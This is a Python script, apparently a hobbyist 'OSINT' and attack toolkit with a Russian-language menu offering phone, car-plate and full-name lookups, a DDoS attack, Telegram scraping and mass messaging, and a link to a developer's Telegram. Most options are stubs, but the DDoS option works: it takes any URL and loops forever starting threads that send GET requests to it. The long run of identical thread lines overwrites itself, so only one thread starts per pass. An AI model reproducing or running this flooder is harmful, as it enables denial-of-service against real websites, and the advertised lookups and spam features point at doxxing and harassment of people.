import time
import os
import validators
import requests
import webbrowser
import threading
os.system('cls||clear')
print('\n')
print('\033[91m██▓      ▄████  ██░ ██  ██▓    ▒██   ██▒ ██▓   ▓██   ██▓    ▒█████    ██████  ██▓ ███▄    █ ▄▄▄█████▓\n▓██▒     ██▒ ▀█▒▓██░ ██▒▓██▒    ▒▒ █ █ ▒░▓██▒    ▒██  ██▒   ▒██▒  ██▒▒██    ▒ ▓██▒ ██ ▀█   █ ▓  ██▒ ▓▒\n▒██░    ▒██░▄▄▄░▒██▀▀██░▒██░    ░░  █   ░▒██░     ▒██ ██░   ▒██░  ██▒░ ▓██▄   ▒██▒▓██  ▀█ ██▒▒ ▓██░ ▒░\n▒██░    ░▓█  ██▓░▓█ ░██ ▒██░     ░ █ █ ▒ ▒██░     ░ ▐██▓░   ▒██   ██░  ▒   ██▒░██░▓██▒  ▐▌██▒░ ▓██▓ ░ \n░██████▒░▒▓███▀▒░▓█▒░██▓░██████▒▒██▒ ▒██▒░██████▒ ░ ██▒▓░   ░ ████▓▒░▒██████▒▒░██░▒██░   ▓██░  ▒██▒ ░ \n░ ▒░▓  ░ ░▒   ▒  ▒ ░░▒░▒░ ▒░▓  ░▒▒ ░ ░▓ ░░ ▒░▓  ░  ██▒▒▒    ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░░▓  ░ ▒░   ▒ ▒   ▒ ░░   \n░ ░ ▒  ░  ░   ░  ▒ ░▒░ ░░ ░ ▒  ░░░   ░▒ ░░ ░ ▒  ░▓██ ░▒░      ░ ▒ ▒░ ░ ░▒  ░ ░ ▒ ░░ ░░   ░ ▒░    ░    \n  ░ ░   ░ ░   ░  ░  ░░ ░  ░ ░    ░    ░    ░ ░   ▒ ▒ ░░     ░ ░ ░ ▒  ░  ░  ░   ▒ ░   ░   ░ ░   ░      \n    ░  ░      ░  ░  ░  ░    ░  ░ ░    ░      ░  ░░ ░            ░ ░        ░   ░           ░          \n                                                 ░ ░                                                  \n\n\033[0m')
print('\n')
print('1 - Поиск по номеру          |       7 - База данных\n2 - Поиск по номеру машины   |       8 - Прокси\n3 - Поиск по ФИО             |       9 - TELEGRAM DEV\n4 - Ддос атака\n5 - Парсинг телеграмм\n6 - Рассылка телеграмм')
print('\n')
int = input(' ')


def make_request(url):
    response = requests.get(url)
    print(response.status_code)
        

if int == "1":
    num = input('Введите номер телефона: ')
    print("DEV")

if int == "2":
    num = input('Введите номер машины: ')
    print("DEV.")

if int == "3":
    num = input('Введите ФИО: ')
    print("DEV")

if int == "4":
    url = input("Введите URL сайта:")
    if not validators.url(url):
        print("Введите корректную ссылку")
    else:
        print("Атака успешно начата!")
        while True:
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t = threading.Thread(target=make_request, args=(url,))
            t.start()

if int == "5":
    num = input("Введите ссылку telegram:")
    print("DEV")

if int == "6":
    num = input("Введите ссылку telegram:")
    print("DEV")

if int == "7":
    print("DEV")

if int == "8":
    print("DEV")

if int == "9":
    webbrowser.open('https://t.me/IghIxly', new=2)
